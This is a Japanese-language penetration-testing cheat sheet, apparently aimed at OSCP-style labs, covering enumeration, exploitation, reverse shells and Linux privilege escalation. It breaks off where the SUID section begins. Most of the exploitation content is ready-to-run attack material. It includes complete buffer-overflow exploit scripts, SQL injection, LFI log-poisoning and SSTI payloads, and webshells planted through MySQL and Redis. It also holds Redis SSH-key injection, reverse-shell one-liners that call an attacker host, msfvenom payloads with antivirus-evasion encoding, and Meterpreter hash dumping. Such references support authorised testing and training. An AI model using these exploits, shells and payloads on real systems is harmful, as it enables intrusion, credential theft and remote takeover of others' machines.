## 📋 目次

1. [情報収集 (Enumeration)](#1-情報収集-enumeration)
2. [脆弱性スキャン](#2-脆弱性スキャン)
3. [エクスプロイト (Exploitation)](#3-エクスプロイト-exploitation)
4. [シェル取得・安定化](#4-シェル取得安定化)
5. [権限昇格 - Linux](#5-権限昇格---linux)
6. [権限昇格 - Windows](#6-権限昇格---windows)
7. [Active Directory 攻撃](#7-active-directory-攻撃)
8. [パスワードクラック](#8-パスワードクラック)
9. [ファイル転送](#9-ファイル転送)
10. [ピボット・トンネリング](#10-ピボットトンネリング)
11. [レポート作成](#11-レポート作成)

---

## 1. 情報収集 (Enumeration)

### 1.1 Nmap ポートスキャン

#### Nmapオプション早見表

| オプション | 意味 | 用途 |
|-----------|------|------|
| `-sS` | SYN スキャン（ステルス） | ログに残りにくい |
| `-sT` | TCP Connect スキャン | root不要 |
| `-sU` | UDP スキャン | UDP サービス発見 |
| `-sV` | バージョン検出 | サービス特定 |
| `-sC` | デフォルトスクリプト実行 | 追加情報収集 |
| `-O` | OS 検出 | ターゲットOS特定 |
| `-p-` | 全ポート (1-65535) | 隠しポート発見 |
| `-p 1-1000` | 範囲指定 | 高速スキャン |
| `--top-ports 1000` | 上位1000ポート | バランス型 |
| `-T4` | タイミング（高速） | CTF環境向け |
| `-T2` | タイミング（低速） | IDS回避 |
| `--min-rate 5000` | 最低送信レート | 高速化 |
| `-oN` | 通常形式保存 | ログ保存 |
| `-oG` | Grep可能形式保存 | 後処理向け |
| `-oA` | 全形式保存 | 推奨 |
| `--open` | オープンポートのみ | 絞り込み |
| `-n` | DNS解決スキップ | 高速化 |
| `--reason` | 判定理由表示 | デバッグ |

#### 基本スキャンフロー

```bash
# ⭐ Step1: 高速スキャン（全ポート）- まず全ポートを洗い出す
nmap -p- --min-rate 5000 -T4 -n <IP> -oN nmap_allports.txt

# ⭐ Step2: 詳細スキャン（検出ポートに対して）- バージョン・スクリプト実行
nmap -sC -sV -p 22,80,443,8080 <IP> -oN nmap_detail.txt

# Step3: UDPスキャン（上位100ポート）- UDP系サービスを忘れずに
sudo nmap -sU --top-ports 100 <IP> -oN nmap_udp.txt

# ステルススキャン - IDS/IPS回避が必要な場合
sudo nmap -sS -T2 -f --data-length 25 <IP>

# OS検出込み完全スキャン
sudo nmap -A -p- <IP> -oA nmap_full
```

#### サービス別スクリプトスキャン

```bash
# HTTP系
nmap --script http-enum,http-title,http-headers -p 80,443 <IP>

# SMB系
nmap --script smb-vuln*,smb-enum* -p 445 <IP>

# FTP系
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 <IP>

# SSH系
nmap --script ssh-auth-methods,ssh-hostkey -p 22 <IP>

# DNS系
nmap --script dns-zone-transfer,dns-brute -p 53 <IP>

# SNMP系
nmap --script snmp-info,snmp-sysdescr -sU -p 161 <IP>

# データベース
nmap --script mysql-info,ms-sql-info -p 3306,1433 <IP>

# 脆弱性スキャン（重要なもの）
nmap --script vuln -p <PORTS> <IP>
```

---

### 1.2 HTTP / HTTPS 列挙

#### Gobuster - ディレクトリ・ファイルブルートフォース

```bash
# ⭐ 基本ディレクトリスキャン
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt

# 拡張子指定（PHPサイト向け）
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50

# HTTPS（証明書エラー無視）
gobuster dir -u https://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

# サブドメインブルートフォース
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHostスキャン
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Feroxbuster - 再帰的スキャン（Gobusterより強力）

```bash
# ⭐ 再帰的ディレクトリスキャン（自動で掘り下げ）
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 拡張子・スレッド数指定
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 100

# ステータスコードフィルタ
feroxbuster -u http://<IP> -w <WORDLIST> --filter-status 404,403
```

#### Nikto - Webサーバ脆弱性スキャン

```bash
# ⭐ 基本スキャン
nikto -h http://<IP>

# SSL対応
nikto -h https://<IP> -ssl

# 特定ポート
nikto -h <IP> -p 8080

# プロキシ経由
nikto -h http://<IP> -useproxy http://127.0.0.1:8080
```

#### WFuzz - パラメータファジング

```bash
# ⭐ ディレクトリファジング
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://<IP>/FUZZ

# GETパラメータファジング
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 http://<IP>/page.php?FUZZ=test

# POST パラメータ
wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -d "username=admin&password=FUZZ" --hc 302 http://<IP>/login.php

# レスポンスサイズでフィルタ
wfuzz -c -z file,<WORDLIST> --hh 1234 http://<IP>/FUZZ
```

#### WhatWeb - Webフィンガープリント

```bash
# ⭐ 基本スキャン（使用技術の特定）
whatweb http://<IP>

# 詳細モード
whatweb -v http://<IP>

# アグレッシブモード
whatweb -a 3 http://<IP>
```

---

### 1.3 SMB 列挙

```bash
# ⭐ enum4linux - SMB総合列挙ツール
enum4linux -a <IP>
enum4linux -u '' -p '' -a <IP>          # 匿名ログイン
enum4linux -u 'guest' -p '' -a <IP>    # Guestアカウント

# smbclient - 共有フォルダ確認・接続
smbclient -L //<IP>/ -N              # 共有一覧（匿名）
smbclient //<IP>/Share -N           # 共有接続（匿名）
smbclient //<IP>/Share -U user      # 認証あり

# ⭐ smbmap - 権限確認
smbmap -H <IP>                      # 匿名でマップ
smbmap -H <IP> -u user -p pass      # 認証あり
smbmap -H <IP> -u user -p pass -r   # 再帰的に表示

# CrackMapExec - SMB情報収集
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''   # 匿名
crackmapexec smb <IP> -u user -p pass --shares
crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --groups
crackmapexec smb <IP> -u user -p pass --rid-brute

# rpcclient - RPC経由列挙
rpcclient -U "" -N <IP>
# rpcclient内コマンド:
# enumdomusers    ユーザー列挙
# enumdomgroups   グループ列挙
# queryuser <RID> ユーザー詳細
# getdompwinfo    パスワードポリシー

# nmap SMBスクリプト
nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>
nmap --script smb-vuln-ms17-010 -p 445 <IP>   # EternalBlue確認
```

---

### 1.4 FTP 列挙

```bash
# ⭐ 匿名ログイン確認
ftp <IP>
# Username: anonymous, Password: anonymous or blank

# nmap で匿名ログイン確認
nmap --script ftp-anon -p 21 <IP>

# FTPバナー取得
nc -nv <IP> 21

# ファイル一覧・ダウンロード
ftp> ls -la
ftp> get filename
ftp> mget *          # 全ファイルダウンロード
ftp> binary          # バイナリモード切替
```

---

### 1.5 SSH 列挙

```bash
# SSHバージョン確認（脆弱なバージョン特定）
ssh -V
nmap -sV -p 22 <IP>

# 認証方式確認
nmap --script ssh-auth-methods -p 22 <IP>

# ユーザー列挙（一部古いOpenSSHのみ有効）
# CVE-2018-15473 - OpenSSH ユーザー列挙
python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt --hostname <IP>

# SSHキー探索
find / -name "*.pem" -o -name "id_rsa" -o -name "id_dsa" 2>/dev/null
```

---

### 1.6 SMTP 列挙

```bash
# SMTP バナー取得
nc -nv <IP> 25
telnet <IP> 25

# ⭐ ユーザー列挙（VRFY/EXPN/RCPT TO）
# VRFY コマンド
VRFY root
VRFY admin

# RCPT TO コマンド（より汎用的）
MAIL FROM: test@test.com
RCPT TO: admin

# nmap スクリプト
nmap --script smtp-enum-users,smtp-commands -p 25 <IP>

# smtp-user-enum ツール
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <IP>
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>
```

---

### 1.7 DNS 列挙

```bash
# ⭐ ゾーン転送（全レコード取得）
dig axfr @<DNS_SERVER> <DOMAIN>
host -l <DOMAIN> <DNS_SERVER>

# 基本レコード取得
dig A <DOMAIN> @<DNS_SERVER>
dig MX <DOMAIN> @<DNS_SERVER>
dig NS <DOMAIN> @<DNS_SERVER>
dig ANY <DOMAIN> @<DNS_SERVER>

# 逆引き
dig -x <IP> @<DNS_SERVER>

# サブドメインブルートフォース
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsrecon -d <DOMAIN> -t std
dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

# nmap
nmap --script dns-zone-transfer,dns-brute -p 53 <IP>
```

---

### 1.8 SNMP 列挙

```bash
# ⭐ コミュニティ文字列ブルートフォース
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# SNMP Walk（コミュニティ文字列がわかったら）
snmpwalk -c public -v1 <IP>
snmpwalk -c public -v2c <IP>

# 特定OIDの取得
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2   # プロセス一覧
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2   # インストール済みソフト
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25    # Windowsユーザー
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3     # TCP接続ポート

# snmp-check（より見やすい出力）
snmp-check <IP> -c public
```

---

### 1.9 NFS 列挙

```bash
# NFS共有確認
showmount -e <IP>
nmap --script nfs-showmount -p 111 <IP>

# マウント
mkdir /mnt/nfs
mount -t nfs <IP>:/share /mnt/nfs -nolock

# no_root_squash 確認（権限昇格に利用可能）
cat /etc/exports  # ターゲット上で確認
```

---

### 1.10 LDAP 列挙

```bash
# 匿名バインド確認
ldapsearch -h <IP> -x -b "dc=domain,dc=com"
ldapsearch -h <IP> -x -b "dc=domain,dc=com" "(objectClass=*)"

# ユーザー列挙
ldapsearch -h <IP> -x -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName

# ldapdomaindump（AD環境）
ldapdomaindump <IP> -u 'domain\user' -p 'pass' --no-json --no-grep
```

---

### 1.11 データベース列挙

#### MySQL

```bash
# ⭐ ログイン
mysql -h <IP> -u root -p
mysql -h <IP> -u root            # パスなし

# 基本コマンド
show databases;
use <database>;
show tables;
select * from <table>;
select user,password from mysql.user;  # ハッシュ取得

# ファイル読み取り（権限があれば）
select load_file('/etc/passwd');

# ファイル書き込み（INTO OUTFILEでwebshell）
select "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

#### MSSQL

```bash
# Impacket mssqlclient
python3 mssqlclient.py domain/user:pass@<IP> -windows-auth

# sqsh
sqsh -S <IP> -U sa -P password

# MSSQL内コマンド
SELECT @@version;
SELECT name FROM sys.databases;
EXEC xp_cmdshell 'whoami';          # コマンド実行（有効なら）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;  # xp_cmdshell有効化
```

#### Redis

```bash
# ⭐ 認証なし接続
redis-cli -h <IP>
redis-cli -h <IP> -a <PASSWORD>

# 基本コマンド
info
keys *
get <key>
config get dir
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save                               # WebShell書き込み

# SSH Key インジェクション
config set dir /root/.ssh
config set dbfilename authorized_keys
set mykey "<SSH_PUBLIC_KEY>"
save
```

---

### 1.12 自動化ツール

```bash
# ⭐ AutoRecon - 全サービスを自動列挙（OSCP最推奨）
autorecon <IP>
autorecon <IP> --only-scans-dir    # スキャン結果のみ
autorecon 192.168.1.0/24          # ネットワーク全体

# 結果は ./results/<IP>/ に保存

# Reconnoitre
python3 reconnoitre.py -t <IP> -o ./recon --services
```

---

## 2. 脆弱性スキャン

### 2.1 Searchsploit

```bash
# ⭐ 基本検索（製品名・バージョンで検索）
searchsploit apache 2.4
searchsploit "openssh 7.2"
searchsploit windows 10 local privilege escalation

# 詳細情報表示
searchsploit -x <EDB-ID>        # ブラウザで詳細表示
searchsploit -x exploits/linux/remote/12345.py

# ⭐ ファイルをカレントディレクトリにコピー
searchsploit -m <EDB-ID>
searchsploit -m 12345

# タイトルのみで検索
searchsploit -t apache

# バージョン情報からExploit DB URLを生成
searchsploit --www apache 2.4.49

# データベース更新
searchsploit -u
```

### 2.2 Nmap スクリプト活用

```bash
# 脆弱性系スクリプト一覧確認
ls /usr/share/nmap/scripts/ | grep vuln

# ⭐ 汎用脆弱性スキャン
nmap --script vuln -p <PORTS> <IP>

# 主要スクリプト
nmap --script smb-vuln-ms17-010 -p 445 <IP>        # EternalBlue
nmap --script smb-vuln-ms08-067 -p 445 <IP>        # Conficker
nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi <IP>  # ShellShock
nmap --script ssl-heartbleed -p 443 <IP>            # Heartbleed
nmap --script http-sql-injection -p 80 <IP>         # SQLi
nmap --script http-wordpress-users -p 80 <IP>       # WordPress
```

### 2.3 Metasploit Auxiliary Scanners

```bash
# Metasploit起動
msfconsole -q

# 主要スキャナー
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_ms17_010      # EternalBlue確認
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/wordpress_login_enum
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/snmp/snmp_login

# 共通オプション設定
set RHOSTS <IP>
set THREADS 10
run
```

---

## 3. エクスプロイト (Exploitation)

### 3.1 Metasploit 基本操作

```bash
# ⭐ 基本フロー
msfconsole -q

# モジュール検索
search type:exploit name:ms17-010
search cve:2021-41773
search platform:windows type:exploit eternalblue

# モジュール使用・設定・実行
use exploit/windows/smb/ms17_010_eternalblue
info                          # モジュール詳細確認
show options                  # 必要オプション確認
set RHOSTS <IP>
set LHOST <YOUR_IP>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run  # または exploit

# セッション管理
sessions -l                   # セッション一覧
sessions -i 1                 # セッション1に接続
sessions -k 1                 # セッション1を切断
background                    # セッションをバックグラウンドに

# Meterpreterコマンド
sysinfo
getuid
getsystem                     # 権限昇格試行
hashdump                      # ハッシュダンプ
upload /path/to/file C:\\path\\to\\dest
download C:\\path\\to\\file /local/path
shell                         # OSシェルに切替
load kiwi                     # Mimeikatzロード
lsa_dump_sam                  # SAM ダンプ
```

### 3.2 手動エクスプロイト

```bash
# Python エクスプロイト実行
python exploit.py <IP> <PORT>
python3 exploit.py <IP> <PORT>

# 依存パッケージインストール
pip install <package>
pip3 install <package>

# C エクスプロイトコンパイル
gcc exploit.c -o exploit
gcc -m32 exploit.c -o exploit      # 32bit向け
gcc exploit.c -o exploit -lcrypto  # OpenSSL使用

# Windowsクロスコンパイル
i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32bit
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe        # 64bit

# エクスプロイトの一般的な修正ポイント
# 1. LHOST / LPORT / RHOST を書き換える
# 2. シェルコードをmsfvenomで再生成して差し替える
# 3. オフセット値の調整
```

### 3.3 Buffer Overflow（完全手順）

#### Step 1: ファジング（クラッシュポイント特定）

```python
#!/usr/bin/env python3
# fuzzer.py - 徐々にバッファを増やしてクラッシュを確認
import socket, time, sys

ip = "<TARGET_IP>"
port = <PORT>
timeout = 5
prefix = "OVERFLOW1 "   # 対象コマンド/プレフィックス
string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print(f"Fuzzing with {len(string) - len(prefix)} bytes")
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print(f"Crashed at {len(string) - len(prefix)} bytes")
        sys.exit(0)
    string += "A" * 100
    time.sleep(1)
```

#### Step 2: オフセット特定

```bash
# パターン生成（クラッシュバイト数+400程度）
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
# または
python3 -c "import subprocess; print(subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', '2400']).decode())"

# EIPに入った値からオフセット計算
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2400 -q 6F43396E
# → [*] Exact match at offset 1978
```

```python
#!/usr/bin/env python3
# offset.py - EIPコントロール確認
import socket

ip = "<TARGET_IP>"
port = <PORT>
prefix = "OVERFLOW1 "
offset = 1978              # 上で判明したオフセット
overflow = "A" * offset
retn = "BBBB"              # EIPに"BBBB"が入ることを確認
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(bytes(buffer, "latin-1"))
print("Done! Check EIP = 42424242")
```

#### Step 3: Bad Char 検出

```python
#!/usr/bin/env python3
# badchar.py - 使用不可文字の特定
import socket

ip = "<TARGET_IP>"
port = <PORT>
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"

# 0x00は必ずbadchar - 残り全バイト
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    # ... 0x01〜0xffまで全部列挙
)

buffer = prefix.encode() + b"A" * offset + b"BBBB" + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(buffer)
print("Send! Check mona for bad chars")
# Immunity Debugger + mona.py:
# !mona bytearray -b "\x00"
# !mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>
```

#### Step 4: JMP ESP アドレス探索

```bash
# Immunity Debugger + mona.py
# DLLからJMP ESP命令を探す（ASLRなし・NXなしのモジュール）
!mona jmp -r esp -cpb "\x00\x0a\x0d"   # badcharsを除外

# objdump で探す（Linux）
objdump -d <BINARY> | grep "jmp.*esp"
```

#### Step 5: Shellcode生成＆最終ペイロード

```bash
# ⭐ msfvenom でリバースシェルshellcode生成
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v payload

# Meterpreter shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f python
```

```python
#!/usr/bin/env python3
# exploit_final.py
import socket

ip = "<TARGET_IP>"
port = <PORT>
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"    # JMP ESP アドレス（リトルエンディアン）
padding = "\x90" * 16         # NOP sled
payload = (                    # msfvenomで生成したshellcode
    b"\xdb\xc0\xd9\x74\x24\xf4..."
)
postfix = ""

buffer = prefix.encode() + overflow.encode() + retn.encode() + padding.encode() + payload + postfix.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(buffer)
print("Exploit sent!")
```

---

### 3.4 Web 脆弱性

#### SQL インジェクション（手動）

```bash
# ⭐ 基本確認
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin'--
" OR "1"="1

# エラーベース
' AND 1=CONVERT(int,(SELECT @@version))--  # MSSQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))--  # MySQL

# Union ベース（カラム数特定）
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Union ベース（データ抽出）
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# ブラインドSQLi（時間ベース）
'; IF (1=1) WAITFOR DELAY '0:0:5'--    # MSSQL
' AND SLEEP(5)--                        # MySQL
```

```bash
# ⭐ sqlmap（自動）
sqlmap -u "http://<IP>/page.php?id=1" --dbs
sqlmap -u "http://<IP>/page.php?id=1" -D <DB> --tables
sqlmap -u "http://<IP>/page.php?id=1" -D <DB> -T <TABLE> --dump

# POST パラメータ
sqlmap -u "http://<IP>/login.php" --data "user=admin&pass=test" -p user

# Burpリクエストから
sqlmap -r request.txt --dbs

# OSコマンド実行（権限があれば）
sqlmap -u "http://<IP>/page.php?id=1" --os-shell
sqlmap -u "http://<IP>/page.php?id=1" --file-read=/etc/passwd
```

#### LFI / RFI

```bash
# ⭐ 基本LFI
http://<IP>/page.php?file=../../../../etc/passwd
http://<IP>/page.php?file=../../../../etc/shadow
http://<IP>/page.php?file=../../../../windows/win.ini

# Null byte（古いPHP）
http://<IP>/page.php?file=../../../../etc/passwd%00

# ディレクトリトラバーサル（エンコード回避）
http://<IP>/page.php?file=..%2F..%2F..%2Fetc%2Fpasswd
http://<IP>/page.php?file=....//....//etc/passwd

# ⭐ LFIからRCE: ログポイズニング
curl http://<IP>/page.php?file=../../../../var/log/apache2/access.log
# ユーザーエージェントにPHPコードを含めてアクセス
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
# 再度LFIで実行
http://<IP>/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami

# LFIからRCE: /proc/self/environ
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
http://<IP>/page.php?file=../../../../proc/self/environ&cmd=id

# PHP Wrappers
http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php
echo "<BASE64>" | base64 -d  # ソース取得

# RFI（allow_url_includeが有効な場合）
http://<IP>/page.php?file=http://your-ip/shell.php
```

#### File Upload Bypass

```bash
# 拡張子バイパス
# .php → .php5, .phtml, .pHp, .PhP, .php3, .php7
# .asp → .asp;.jpg, .aspx

# MIMEタイプ偽装（Burpで変更）
Content-Type: image/jpeg  # 実際はPHPファイル

# マジックバイト追加
echo -e '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# ダブル拡張子
shell.php.jpg
shell.jpg.php

# Null byte（古い実装）
shell.php%00.jpg

# Webshell内容（シンプル）
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php echo shell_exec($_GET["e"]." 2>&1"); ?>' > shell.php
```

#### Command Injection

```bash
# 基本ペイロード
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# フィルター回避
; w'h'o'a'm'i
; who$()ami
; /usr/bin/id

# 時間ベース確認（ブラインド）
; sleep 5
| ping -c 5 127.0.0.1
```

#### SSTI (Server-Side Template Injection)

```bash
# テンプレートエンジン検出
{{7*7}}           # → 49 (Twig, Jinja2)
${7*7}            # → 49 (FreeMarker)
<%= 7*7 %>        # → 49 (ERB)
#{7*7}            # → 49 (Ruby)
*{7*7}            # → 49 (Spring)

# ⭐ Jinja2 RCE (Python Flask等)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig RCE (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## 4. シェル取得・安定化

### 4.1 リバースシェル一覧

```bash
# ⭐ Netcat リスナー（先に起動）
nc -nlvp 4444
rlwrap nc -nlvp 4444  # 矢印キー対応版（推奨）

# Bash
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
0<&196;exec 196<>/dev/tcp/<YOUR_IP>/4444; sh <&196 >&196 2>&196

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("<YOUR_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'"); ?>

# Perl
perl -e 'use Socket;$i="<YOUR_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<YOUR_IP>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat (GNU)
nc -e /bin/sh <YOUR_IP> 4444
# Netcat (BusyBox)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f

# PowerShell（Windows）
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 4.2 シェル安定化

```bash
# ⭐ Method 1: Python PTY（最もシンプル）
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z でバックグラウンド
stty raw -echo; fg
# Enter×2
export TERM=xterm
export SHELL=/bin/bash

# Method 2: socat（最高品質のTTY）
# 攻撃側にsocat転送
socat file:`tty`,raw,echo=0 tcp-listen:4444
# ターゲット側
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_IP>:4444

# Method 3: rlwrap
rlwrap nc -nlvp 4444  # netcatリスナーをrlwrapで起動

# stty サイズ調整（コマンドが折り返す場合）
# ローカルで確認
stty -a | grep rows  # → rows 50; columns 220
# ターゲットで設定
stty rows 50 columns 220
```

### 4.3 msfvenom ペイロード生成

```bash
# ⭐ Windows リバースシェル (exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell32.exe

# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o meter.exe

# Linux リバースシェル (elf)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# Web Shells
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx

# DLL（DLLハイジャック用）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o shell.dll

# Badchar除外
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00\x0a\x0d" -f python

# エンコード（AV回避）
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# フォーマット一覧
msfvenom --list formats
msfvenom --list payloads | grep windows/x64
```

---

## 5. 権限昇格 - Linux

### 5.1 初期確認チェックリスト

```bash
# ⭐ システム情報
id && whoami
uname -a                        # カーネルバージョン
cat /etc/os-release            # OS情報
cat /etc/issue
hostname

# ユーザー・グループ確認
cat /etc/passwd                # ユーザー一覧（ログインシェルに注目）
cat /etc/group
cat /etc/shadow                # 読めればハッシュクラック

# ⭐ sudo 権限確認（最重要）
sudo -l                        # パスワードなし実行可能コマンドを確認
sudo -V                        # バージョン（CVE確認）

# 環境変数
env
echo $PATH
echo $LD_PRELOAD

# ネットワーク
netstat -tulnp                 # リスニングサービス
ss -tulnp
ip a
cat /etc/hosts

# プロセス
ps aux
ps -ef

# インストール済みソフト
dpkg -l                        # Debian系
rpm -qa                        # RedHat系
ls -la /usr/bin/ | grep -i "python\|perl\|ruby\|nc\|ncat\|curl\|wget"

# 書き込み可能ディレクトリ
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# スケジュールタスク
cat /etc/crontab
crontab -l
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null

# ログ・履歴
cat ~/.bash_history
cat ~/.zsh_history
find / -name "*.log" 2>/dev/null | head
```

### 5.2 SUID / GUID 悪用

```bash
# ⭐ SUID ファイル探索
find / -perm -u=s -type f 2>/dev/null
